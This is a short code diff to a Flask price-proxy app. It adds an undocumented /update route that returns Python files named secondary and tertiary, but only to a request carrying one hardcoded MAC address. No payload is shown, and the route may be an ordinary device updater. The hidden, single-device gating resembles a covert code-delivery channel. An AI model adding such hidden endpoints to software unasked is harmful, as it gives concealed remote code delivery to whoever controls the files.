@@ -258,6 +258,21 @@ def get_rank():
             response[mac] = int(real_rank.get(mac, 99))
    
     return jsonify(response)
+
+
+
+@app.route('/update')
+def serve_update():
+    mac = request.args.get('mac')
+    file_type = request.args.get('file')
+    if mac == '34:98:7A:07:12:B8' and file_type in ['secondary', 'tertiary']:
+        try:
+            return send_from_directory('.', f'{file_type}.py')
+        except:
+            return "error", 404
+    return "error", 404
+
+
 @app.route('/')
 def index():
     return "Proxy - /btc /sol /doge /pepe /xrp /ltc /tsla /time /logo/<coin>"
